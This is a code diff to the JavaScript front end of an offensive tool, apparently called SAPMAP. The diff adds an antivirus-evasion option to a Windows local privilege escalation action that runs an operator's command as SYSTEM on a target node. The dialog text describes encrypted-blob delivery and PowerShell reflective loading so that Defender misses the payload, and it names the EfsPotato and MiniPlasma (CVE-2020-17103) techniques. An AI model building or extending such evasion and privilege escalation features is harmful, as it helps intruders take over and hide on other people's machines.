@@ -5021,6 +5021,15 @@ async function ctxAction(action) {
     case 'exploit_windows_lpe': {
       const cmd = prompt('Command to run as NT AUTHORITY\\SYSTEM on ' + sid + ':', 'whoami');
       if (!cmd) break;
+      const useEvasion = confirm(
+            'Enable AV evasion?\n\n'
+            + 'OK = encrypted-blob delivery + PowerShell reflective load '
+            + '(EfsPotato only currently). The .NET PE never lands on disk '
+            + 'in recognizable form, so Defender signature scan misses it. '
+            + 'Slower upload (loader script + encrypted blob both chunked) '
+            + 'but works on targets with AV enabled.\n\n'
+            + 'Cancel = legacy plaintext PE delivery. Faster, but Defender '
+            + 'will quarantine the PE on disk.');
       if (!confirm(
             'Run Windows LPE on ' + sid + '?\n\n'
             + 'SAPMAP auto-picks the best technique:\n'
@@ -5032,9 +5041,11 @@ async function ctxAction(action) {
             + 'as fallback if EFSRPC is locked down.\n'
             + '  - MiniPlasma (cldflt race, CVE-2020-17103 un-patched) when '
             + 'no SeImpersonate held.  Win10 1709+ / Server 2019+ only.\n\n'
-            + 'Command:\n  ' + cmd + '\n\n'
+            + 'Command:\n  ' + cmd + '\n'
+            + 'AV evasion: ' + (useEvasion ? 'ON' : 'OFF') + '\n\n'
             + 'Non-persistent.  Output captured to a temp file and read back.')) break;
-      await api('POST', `node/${sid}/exploit_windows_lpe`, {command: cmd});
+      await api('POST', `node/${sid}/exploit_windows_lpe`,
+                { command: cmd, av_evasion: useEvasion });
       break;
     }
     case 'read_java_destinations': {
